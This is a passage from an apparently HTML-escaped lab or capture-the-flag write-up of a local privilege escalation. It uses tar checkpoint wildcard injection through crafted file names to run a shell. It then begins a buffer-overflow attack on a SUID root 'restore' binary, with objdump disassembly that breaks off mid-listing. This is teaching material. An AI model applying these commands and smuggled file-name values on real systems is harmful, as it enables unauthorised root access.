class="s2"&gt;&amp;quot;HOME=/home/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_COMMAND=/usr/local/bin/dice&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SHLVL=14&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LOGNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_VERSION=1.26&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LESSOPEN=||/usr/bin/lesspipe.sh %s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_GID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;_=/bin/tar&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;The &lt;code&gt;-s 999&lt;/code&gt; allows to specify the maximum string size to print&lt;/li&gt;
&lt;li&gt;the -v prints more informations&lt;/li&gt;
&lt;li&gt;the -f see the child process calls, you would not see a lot of things without
  this flag&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We can see that the &lt;code&gt;tar&lt;/code&gt; utility is used. We have seen in the previous link
that we can exploit it using the &lt;code&gt;checkpoint&lt;/code&gt;. The backup directory is
&lt;code&gt;/usr/share/nginx/serverchecker/storage&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[bryan@fII bin]$ touch &amp;#39;/usr/share/nginx/serverchecker/storage/--checkpoint=1&amp;#39;
[bryan@fII bin]$ touch &amp;#39;/usr/share/nginx/serverchecker/storage/--checkpoint-action=exec=sh shell.sh&amp;#39;
[bryan@fII bin]$ echo &amp;#39;/bin/sh&amp;#39; &amp;amp;gt; /usr/share/nginx/serverchecker/storage/shell.sh
[bryan@fII bin]$ chmod +x /usr/share/nginx/serverchecker/storage/shell.sh
[bryan@fII bin]$ ls -al /usr/share/nginx/serverchecker/storage/
total 20
drwxrwxrwx.  5 nginx nginx 4096 Mar 12 11:54 .
drwxr-xr-x. 10 nginx nginx 4096 Jun 22  2015 ..
drwxr-xr-x.  2 nginx nginx   23 Jun 22  2015 app
-rw-rw-r--   1 bryan bryan    0 Mar 12 11:52 --checkpoint=1
-rw-rw-r--   1 bryan bryan    0 Mar 12 11:53 --checkpoint-action=exec=sh shell.sh
-rwxrwxrwx.  1 nginx nginx 6144 Feb 14 14:40 database.sqlite
drwxr-xr-x.  5 nginx nginx   45 Jun 22  2015 framework
drwxr-xr-x.  2 nginx nginx   39 Jun 22  2015 logs
-rw-rw-r--   1 bryan bryan    8 Mar 12 11:54 shell.s
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We launch the backup program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[bryan@fII bin]$ /usr/local/bin/backup
sh-4.2$ id
id
uid=1002(sean) gid=1001(bryan) groups=1002(sean),1001(bryan)
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;root me?&lt;/h3&gt;
&lt;p&gt;Let get us back a real shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You may need to change the permission of bryan's &lt;code&gt;.bashrc&lt;/code&gt; as you can get an
error about it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[bryan@fII ~]$ chmod 777 ~/.*
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(Yes I had to exit the shell and start again the operations :/)&lt;/p&gt;
&lt;p&gt;Next we need to use the &lt;code&gt;restore&lt;/code&gt; program also in &lt;code&gt;/usr/local/bin/&lt;/code&gt; own by root
with the SUID set and executable by the &lt;code&gt;sean&lt;/code&gt; group. First we need to change
our group (as the one used is &lt;code&gt;bryan&lt;/code&gt;).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;newgrp sean
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let us try the program by creating and empty archive in &lt;code&gt;/tmp/&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[sean@fII storage]$ cd /tmp/
[sean@fII tmp]$ touch backup.tar.gz
[sean@fII tmp]$ cd /usr/local/bin
[sean@fII bin]$ ./restore
Restore tool v0.1
Enter the path to the backup.tar.gz: /tmp/
Path is: /tmp/
Enter the output directory: /tmp/
Output directory is: /tmp/
This is a beta, run the following command for now: 
/bin/sh -c &amp;quot;/usr/bin/tar xf /tmp/backup.tar.gz -C /tmp/ database.sqlite&amp;quot;
You are currently running this tool as: 
uid=0(root) gid=0(root) groups=0(root),1001(bryan),1002(sean)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This looks like we would have to use a buffer overflow the get a root shell as
the program segfault when the input for the "output directory" is too long:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[sean@fII tmp]$ /usr/local/bin/restore
/usr/local/bin/restore
Restore tool v0.1
Enter the path to the backup.tar.gz: /tmp/
/tmp/
Path is: /tmp/
Enter the output directory: qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklqwertyuiopasdfghjklzxcvbnmqwertyuiop
qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklqwertyuiopasdfghjklzxcvbnmqwertyuiop
Output directory is: qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklqwertyuiopasdfghjklzxcvbnmqwertyuiop
Segmentation fault
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let us used objdump to see what we can do and to which address get back in the
program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;objdump&lt;/span&gt; &lt;span class="nt"&gt;-d&lt;/span&gt; &lt;span class="o"&gt;./&lt;/span&gt;&lt;span class="nt"&gt;restore&lt;/span&gt;
&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;...&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;0000000000400fe1&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;get_out_path&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;:&lt;/span&gt;
  &lt;span class="nt"&gt;400fe1&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;55&lt;/span&gt;                      &lt;span class="nt"&gt;push&lt;/span&gt;   &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;rbp&lt;/span&gt;
  &lt;span class="nt"&gt;400fe2&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;48&lt;/span&gt; &lt;span class="nt"&gt;89&lt;/span&gt; &lt;span class="nt"&gt;e5&lt;/span&gt;                &lt;span class="nt"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;rbp&lt;/span&gt;
  &lt;span class="nt"&gt;400fe5&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;48&lt;/span&gt; &lt;span class="nt"&gt;83&lt;/span&gt; &lt;span class="nt"&gt;ec&lt;/span&gt; &lt;span class="nt"&gt;40&lt;/span&gt;             &lt;span class="nt"&gt;sub&lt;/span&gt;    &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0x40&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;rsp&lt;/span&gt;
  &lt;span class="nt"&gt;400fe9&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;bf&lt;/span&gt; &lt;span class="nt"&gt;77&lt;/span&gt; &lt;span class="nt"&gt;2b&lt;/span&gt; &lt;span class="nt"&gt;49&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0x492b77&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;edi&lt;/span&gt;
  &lt;span class="nt"&gt;400fee&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;b8&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0x0&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
  &lt;span class="nt"&gt;400ff3&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;e8&lt;/span&gt; &lt;span class="nt"&gt;38&lt;/span&gt; &lt;span class="nt"&gt;11&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;callq&lt;/span&gt;  &lt;span class="nt"&gt;402130&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;_IO_printf&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
  &lt;span class="nt"&gt;400ff8&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;48&lt;/span&gt; &lt;span class="nt"&gt;8d&lt;/span&gt; &lt;span class="nt"&gt;45&lt;/span&gt; &lt;span class="nt"&gt;c0&lt;/span&gt;             &lt;span class="nt"&gt;lea&lt;/span&gt;    &lt;span class="nt"&gt;-0x40&lt;/span&gt;&lt;span class="o"&gt;(%&lt;/span&gt;&lt;span class="nt"&gt;rbp&lt;/span&gt;&lt;span class="o"&gt;),%&lt;/span&gt;&lt;span class="nt"&gt;rax&lt;/span&gt;
  &lt;span class="nt"&gt;400ffc&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;48&lt;/span&gt; &lt;span class="nt"&gt;89&lt;/span&gt; &lt;span class="nt"&gt;c7&lt;/span&gt;                &lt;span class="nt"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;rax&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;rdi&lt;/span&gt;
  &lt;span class="nt"&gt;400fff&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;e8&lt;/span&gt; &lt;span class="nt"&gt;2c&lt;/span&gt; &lt;span class="nt"&gt;15&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;callq&lt;/span&gt;  &lt;span class="nt"&gt;402530&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;_IO_gets&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
  &lt;span class="nt"&gt;401004&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;48&lt;/span&gt; &lt;span class="nt"&gt;8d&lt;/span&gt; &lt;span class="nt"&gt;45&lt;/span&gt; &lt;span class="nt"&gt;c0&lt;/span&gt;             &lt;span class="nt"&gt;lea&lt;/span&gt;    &lt;span class="nt"&gt;-0x40&lt;/span&gt;&lt;span class="o"&gt;(%&lt;/span&gt;&lt;span class="nt"&gt;rbp&lt;/span&gt;&lt;span class="o"&gt;),%&lt;/span&gt;&lt;span class="nt"&gt;rax&lt;/span&gt;
  &lt;span class="nt"&gt;401008&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;48&lt;/span&gt; &lt;span class="nt"&gt;89&lt;/span&gt; &lt;span class="nt"&gt;c6&lt;/span&gt;                &lt;span class="nt"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;rax&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;rsi&lt;/span&gt;
  &lt;span class="nt"&gt;40100b&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;bf&lt;/span&gt; &lt;span class="nt"&gt;94&lt;/span&gt; &lt;span class="nt"&gt;2b&lt;/span&gt; &lt;span class="nt"&gt;49&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0x492b94&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;edi&lt;/span&gt;
  &lt;span class="nt"&gt;401010&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;b8&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0x0&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
  &lt;span class="nt"&gt;401015&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;e8&lt;/span&gt; &lt;span class="nt"&gt;16&lt;/span&gt; &lt;span class="nt"&gt;11&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;callq&lt;/span&gt;  &lt;span class="nt"&gt;402130&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;_IO_printf&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
  &lt;span class="nt"&gt;40101a&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;48&lt;/span&gt; &lt;span class="nt"&gt;8d&lt;/span&gt; &lt;span class="nt"&gt;45&lt;/span&gt; &lt;span class="nt"&gt;c0&lt;/span&gt;             &lt;span class="nt"&gt;lea&lt;/span&gt;    &lt;span class="nt"&gt;-0x40&lt;/span&gt;&lt;span class="o"&gt;(%&lt;/span&gt;&lt;span class="nt"&gt;rbp&lt;/span&gt;&lt;span class="o"&gt;),%&lt;/span&gt;&lt;span class="nt"&gt;rax&lt;/span&gt;
  &lt;span class="nt"&gt;40101e&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;c9&lt;/span&gt;                      &lt;span class="nt"&gt;leaveq&lt;/span&gt; 
  &lt;span class="nt"&gt;40101f&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;c3&lt;/span&gt;                      &lt;span class="nt"&gt;retq&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It looks like the address &lt;code&gt;401f71&lt;/code&gt; would give us a shell if we return there with
the buffer overflow.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;objdump&lt;/span&gt; &lt;span class="nt"&gt;-d&lt;/span&gt; &lt;span class="o"&gt;./&lt;/span&gt;&lt;span class="nt"&gt;restore&lt;/span&gt;
&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;...&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
  &lt;span class="nt"&gt;401f15&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;eb&lt;/span&gt; &lt;span class="nt"&gt;93&lt;/span&gt;                   &lt;span class="nt"&gt;jmp&lt;/span&gt;    &lt;span class="nt"&gt;401eaa&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;do_system&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;0x29a&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
  &lt;span class="nt"&gt;401f17&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;31&lt;/span&gt; &lt;span class="nt"&gt;d2&lt;/span&gt;                   &lt;span class="nt"&gt;xor&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;edx&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;edx&lt;/span&gt;
  &lt;span class="nt"&gt;401f19&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;be&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;f5&lt;/span&gt; &lt;span class="nt"&gt;6b&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0x6bf500&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;esi&lt;/span&gt;
  &lt;span class="nt"&gt;401f1e&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;bf&lt;/span&gt; &lt;span class="nt"&gt;02&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0x2&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;edi&lt;/span&gt;
  &lt;span class="nt"&gt;401f23&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;48&lt;/span&gt; &lt;span class="nt"&gt;c7&lt;/span&gt; &lt;span class="nt"&gt;44&lt;/span&gt; &lt;span class="nt"&gt;24&lt;/span&gt; &lt;span class="nt"&gt;30&lt;/span&gt; &lt;span class="nt"&gt;25&lt;/span&gt; &lt;span class="nt"&gt;2d&lt;/span&gt;    &lt;span class="nt"&gt;movq&lt;/span&gt;   &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0x492d25&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x30&lt;/span&gt;&lt;span class="o"&gt;(%&lt;/span&gt;&lt;span class="nt"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
  &lt;span class="nt"&gt;401f2a&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;49&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; 
  &lt;span class="nt"&gt;401f2c&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;48&lt;/span&gt; &lt;span class="nt"&gt;c7&lt;/span&gt; &lt;span class="nt"&gt;44&lt;/span&gt; &lt;span class="nt"&gt;24&lt;/span&gt; &lt;span class="nt"&gt;38&lt;/span&gt; &lt;span class="nt"&gt;1d&lt;/span&gt; &lt;span class="nt"&gt;2d&lt;/span&gt;    &lt;span class="nt"&gt;movq&lt;/span&gt;   &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0x492d1d&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x38&lt;/span&gt;&lt;span class="o"&gt;(%&lt;/span&gt;&lt;span class="nt"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
  &lt;span class="nt"&gt;401f33&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;49&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; 
  &lt;span class="nt"&gt;401f35&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;48&lt;/span&gt; &lt;span class="nt"&gt;89&lt;/span&gt; &lt;span class="nt"&gt;6c&lt;/span&gt; &lt;span class="nt"&gt;24&lt;/span&gt; &lt;span class="nt"&gt;40&lt;/span&gt;          &lt;span class="nt"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;rbp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x40&lt;/span&gt;&lt;span class="o"&gt;(%&lt;/span&gt;&lt;span class="nt"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
  &lt;span class="nt"&gt;401f3a&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;48&lt;/span&gt; &lt;span class="nt"&gt;c7&lt;/span&gt; &lt;span class="nt"&gt;44&lt;/span&gt; &lt;span class="nt"&gt;24&lt;/span&gt; &lt;span class="nt"&gt;48&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;    &lt;span class="nt"&gt;movq&lt;/span&gt;   &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0x0&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x48&lt;/span&gt;&lt;span class="o"&gt;(%&lt;/span&gt;&lt;span class="nt"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
  &lt;span class="nt"&gt;401f41&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; 
  &lt;span class="nt"&gt;401f43&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;e8&lt;/span&gt; &lt;span class="nt"&gt;b8&lt;/span&gt; &lt;span class="nt"&gt;e2&lt;/span&gt; &lt;span class="nt"&gt;01&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;callq&lt;/span&gt;  &lt;span class="nt"&gt;420200&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;__sigaction&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
  &lt;span class="nt"&gt;401f48&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;31&lt;/span&gt; &lt;span class="nt"&gt;d2&lt;/span&gt;                   &lt;span class="nt"&gt;xor&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;edx&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;edx&lt;/span&gt;
  &lt;span class="nt"&gt;401f4a&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;be&lt;/span&gt; &lt;span class="nt"&gt;60&lt;/span&gt; &lt;span class="nt"&gt;f4&lt;/span&gt; &lt;span class="nt"&gt;6b&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0x6bf460&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;esi&lt;/span&gt;
  &lt;span class="nt"&gt;401f4f&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;bf&lt;/span&gt; &lt;span class="nt"&gt;03&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0x3&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;edi&lt;/span&gt;
  &lt;span class="nt"&gt;401f54&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;e8&lt;/span&gt; &lt;span class="nt"&gt;a7&lt;/span&gt; &lt;span class="nt"&gt;e2&lt;/span&gt; &lt;span class="nt"&gt;01&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;callq&lt;/span&gt;  &lt;span class="nt"&gt;420200&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;__sigaction&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
  &lt;span class="nt"&gt;401f59&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;48&lt;/span&gt; &lt;span class="nt"&gt;8d&lt;/span&gt; &lt;span class="nt"&gt;74&lt;/span&gt; &lt;span class="nt"&gt;24&lt;/span&gt; &lt;span class="nt"&gt;50&lt;/span&gt;          &lt;span class="nt"&gt;lea&lt;/span&gt;    &lt;span class="nt"&gt;0x50&lt;/span&gt;&lt;span class="o"&gt;(%&lt;/span&gt;&lt;span class="nt"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;),%&lt;/span&gt;&lt;span class="nt"&gt;rsi&lt;/span&gt;
  &lt;span class="nt"&gt;401f5e&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;31&lt;/span&gt; &lt;span class="nt"&gt;d2&lt;/span&gt;                   &lt;span class="nt"&gt;xor&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;edx&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;edx&lt;/span&gt;
  &lt;span class="nt"&gt;401f60&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;bf&lt;/span&gt; &lt;span class="nt"&gt;02&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0x2&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;edi&lt;/span&gt;
